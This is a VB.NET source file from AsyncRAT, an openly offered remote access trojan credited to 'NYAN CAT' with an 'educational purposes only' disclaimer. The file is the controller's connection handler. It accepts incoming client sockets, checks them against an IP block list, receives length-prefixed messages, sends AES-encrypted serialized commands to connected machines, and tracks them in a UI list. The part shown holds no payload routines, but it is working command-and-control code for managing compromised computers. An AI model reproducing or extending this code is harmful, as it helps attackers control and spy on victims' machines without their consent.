Imports System.IO
Imports System.Net.Sockets

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

Public Class Client

    Public ClientSocket As Socket = Nothing
    Public ServerSocket As Server = Nothing
    Public IsConnected As Boolean = False
    Public BufferLength As Long = Nothing
    Public BufferLengthReceived As Boolean = False
    Public Buffer() As Byte = Nothing
    Public MS As MemoryStream = Nothing
    Public IP As String = Nothing
    Public LV As ListViewItem = Nothing

    Sub New(ByVal CL As Socket, SR As Server)

        ClientSocket = CL
        ServerSocket = SR
        ClientSocket.ReceiveBufferSize = 50 * 1000
        ClientSocket.SendBufferSize = 50 * 1000
        IsConnected = True
        BufferLength = 0
        Buffer = New Byte(0) {}
        MS = New MemoryStream
        IP = CL.RemoteEndPoint.ToString

        If ServerSocket.Blocked.Contains(IP.Split(":")(0)) Then
            isDisconnected()
            Return
        Else
            Settings.Online.Add(Me)
            ClientSocket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
        End If

    End Sub

    Async Sub BeginReceive(ByVal ar As IAsyncResult)
        If IsConnected = False OrElse Not ClientSocket.Connected Then
            isDisconnected()
            Exit Sub
        End If
        Try
            Dim Received As Integer = ClientSocket.EndReceive(ar)
            If Received > 0 Then
                If BufferLengthReceived = False Then
                    If Buffer(0) = 0 Then
                        BufferLength = BS(MS.ToArray)
                        MS.Dispose()
                        MS = New MemoryStream
                        If BufferLength > 0 Then
                            Buffer = New Byte(BufferLength - 1) {}
                            BufferLengthReceived = True
                        End If
                    Else
                        Await MS.WriteAsync(Buffer, 0, Buffer.Length)
                    End If
                Else
                    Await MS.WriteAsync(Buffer, 0, Received)
                    If (MS.Length = BufferLength) Then
                        Dim ClientReq As New Incoming_Requests(Me, MS.ToArray)
                        Pending.Req_In.Add(ClientReq)
                        MS.Dispose()
                        MS = New MemoryStream
                        Buffer = New Byte(0) {}
                        BufferLength = 0
                        BufferLengthReceived = False
                    Else
                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
                    End If
                End If
            Else
                isDisconnected()
                Exit Sub
            End If
            ClientSocket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
        Catch ex As Exception
            Debug.WriteLine("Server BeginReceive " + ex.Message)
            isDisconnected()
            Exit Sub
        End Try
    End Sub

    Async Sub BeginSend(ParamArray Msgs As Object())
        If IsConnected OrElse ClientSocket.Connected Then
            Try
                Dim Packer As New Pack
                Dim Data As Byte() = Packer.Serialize(Msgs)

                Using MS As New MemoryStream
                    Dim b As Byte() = AES_Encryptor(Data)
                    Dim L As Byte() = SB(b.Length & CChar(vbNullChar))
                    Await MS.WriteAsync(L, 0, L.Length)
                    Await MS.WriteAsync(b, 0, b.Length)

                    ClientSocket.Poll(-1, SelectMode.SelectWrite)
                    ClientSocket.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                End Using
            Catch ex As Exception
                Debug.WriteLine("BeginSend " + ex.Message)
                isDisconnected()
            End Try
        End If
    End Sub

    Sub EndSend(ByVal ar As IAsyncResult)
        Try
            ClientSocket.EndSend(ar)
        Catch ex As Exception
            Debug.WriteLine("EndSend " + ex.Message)
            isDisconnected()
        End Try
    End Sub

    Delegate Sub _isDisconnected()
    Sub isDisconnected()

        IsConnected = False
        Settings.Online.Remove(Me)

        Try
            If LV IsNot Nothing Then
                If Messages.F.InvokeRequired Then
                    Messages.F.Invoke(New _isDisconnected(AddressOf isDisconnected))
                    Exit Sub
                Else
                    LV.Remove()
                    Messages.ClinetLog(Me, "Disconnected", Color.Red)
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine("L.Remove " + ex.Message)
        End Try

        Try
            ClientSocket.Close()
            ClientSocket.Dispose()
        Catch ex As Exception
            Debug.WriteLine("C.Close " + ex.Message)
        End Try

        Try
            MS.Close()
            MS.Dispose()
        Catch ex As Exception
            Debug.WriteLine("MS.Dispose " + ex.Message)
        End Try

    End Sub

End Class
